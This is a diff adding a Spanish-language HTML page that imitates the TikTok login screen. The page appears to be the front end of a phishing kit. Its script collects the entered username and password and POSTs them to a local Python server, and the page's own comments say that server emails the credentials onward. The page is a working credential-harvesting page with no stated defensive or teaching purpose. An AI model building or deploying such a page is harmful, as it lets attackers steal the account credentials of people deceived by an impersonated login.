@@ -1,0 +1,181 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Iniciar sesión | TikTok</title>
+    <style>
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            background-color: #ffffff;
+            margin: 0;
+        }
+        .login-container {
+            background-color: white;
+            padding: 40px;
+            width: 100%;
+            max-width: 380px;
+            text-align: center;
+        }
+        /* Simulación del logo de TikTok */
+        .logo {
+            font-size: 36px;
+            font-weight: 800;
+            margin-bottom: 30px;
+            letter-spacing: -1px;
+            color: #000;
+            position: relative;
+            display: inline-block;
+        }
+        h2 {
+            font-size: 28px;
+            margin-bottom: 30px;
+            font-weight: 700;
+        }
+        input[type="text"], input[type="password"] {
+            width: 100%;
+            padding: 14px 16px;
+            margin-bottom: 12px;
+            border: 1px solid #1618231f;
+            border-radius: 4px;
+            box-sizing: border-box;
+            font-size: 16px;
+            background-color: #1618230f;
+            outline: none;
+        }
+        input:focus {
+            border: 1px solid #16182333;
+        }
+        .forgot-password {
+            text-align: left;
+            margin-bottom: 20px;
+            font-size: 14px;
+            color: #161823;
+            font-weight: 600;
+            cursor: pointer;
+        }
+        .forgot-password:hover {
+            text-decoration: underline;
+        }
+        button {
+            width: 100%;
+            padding: 14px;
+            background-color: #FE2C55;
+            color: white;
+            border: none;
+            border-radius: 4px;
+            font-size: 16px;
+            font-weight: 700;
+            cursor: pointer;
+        }
+        button:hover {
+            background-color: #E0284E;
+        }
+        .footer-text {
+            margin-top: 30px;
+            font-size: 15px;
+            color: #161823;
+        }
+        .footer-text span {
+            color: #FE2C55;
+            font-weight: 600;
+            cursor: pointer;
+        }
+        .footer-text span:hover {
+            text-decoration: underline;
+        }
+    </style>
+</head>
+<body>
+    <div class="login-container">
+        <img src="tiktok-logo.png" alt="Descripción de la imagen" width="10%" height="10%">
+        <div class="logo">TikTok</div>
+        <h2>Iniciar sesión en TikTok</h2>
+        
+        <form id="miFormulario">
+            <input type="text" id="username" name="username" placeholder="Teléfono / Correo / Nombre de usuario">
+            <input type="password" id="password" name="password" placeholder="Contraseña">
+            
+            <div class="forgot-password">¿Olvidaste la contraseña?</div>
+            
+            <div id="mensajeError" style="display: none; color: #d32f2f; background: #ffebee; padding: 10px; border-left: 4px solid #f44336; margin-bottom: 15px; font-size: 14px;">
+                <strong>¡Atención!</strong> Por favor, ingresa tu usuario y contraseña para continuar.
+            </div>
+            
+            <button type="submit">Iniciar sesión</button>
+        </form>
+        
+        <div id="mensajeExito" style="display: none; margin-top: 20px; padding: 15px; background: #e8f5e9; border: 1px solid #4caf50; color: #2e7d32; text-align: center; font-weight: bold;">
+            ✓ Ok. Procesando credenciales...
+        </div>
+        
+        <script>
+            const formulario = document.getElementById('miFormulario');
+        
+            formulario.addEventListener('submit', function(event) {
+                event.preventDefault();
+        
+                const usuarioIngresado = document.getElementById('username').value.trim();
+                const contrasenaIngresada = document.getElementById('password').value.trim();
+        
+                const divError = document.getElementById('mensajeError');
+                const divExito = document.getElementById('mensajeExito');
+        
+                if (usuarioIngresado === '' || contrasenaIngresada === '') {
+                    divError.style.display = 'block';
+                    divExito.style.display = 'none';
+                } else {
+                    divError.style.display = 'none';
+                    
+                    // 1. Mostramos mensaje de espera mientras Python trabaja
+                    divExito.style.display = 'block';
+                    divExito.style.color = '#1565c0'; // Color azul para "cargando"
+                    divExito.style.backgroundColor = '#e3f2fd';
+                    divExito.style.borderColor = '#2196f3';
+                    divExito.innerText = "⏳ Procesando y enviando correo, por favor espera...";
+        
+                    fetch('http://localhost:8000', {
+                        method: 'POST',
+                        headers: {
+                            'Content-Type': 'application/json'
+                        },
+                        body: JSON.stringify({ 
+                            username: usuarioIngresado, 
+                            password: contrasenaIngresada 
+                        })
+                    })
+                    .then(response => {
+                        if(response.ok) {
+                            // 2. Si Python responde OK (código 200)
+                            divExito.style.color = '#2e7d32'; // Color verde de éxito
+                            divExito.style.backgroundColor = '#e8f5e9';
+                            divExito.style.borderColor = '#4caf50';
+                            divExito.innerText = "✓ ¡Listo! Los datos fueron enviados a tu correo.";
+                        } else {
+                            // 3. Si Python falla enviando el correo (código 500)
+                            throw new Error("El servidor respondió con error");
+                        }
+                    })
+                    .catch(error => {
+                        // 4. Si el servidor Python no está encendido o hay un error de red
+                        divExito.style.color = '#c62828'; // Color rojo de error
+                        divExito.style.backgroundColor = '#ffebee';
+                        divExito.style.borderColor = '#f44336';
+                        divExito.innerText = "❌ Error: No se pudo conectar con el servidor o enviar el correo.";
+                        console.error('Detalle del error:', error);
+                    });
+                }
+            });
+        </script>
+
+        <div class="footer-text">
+            ¿No tienes cuenta? <span>Registrarse</span>
+        </div>
+    </div>
+
+</body>
+</html>
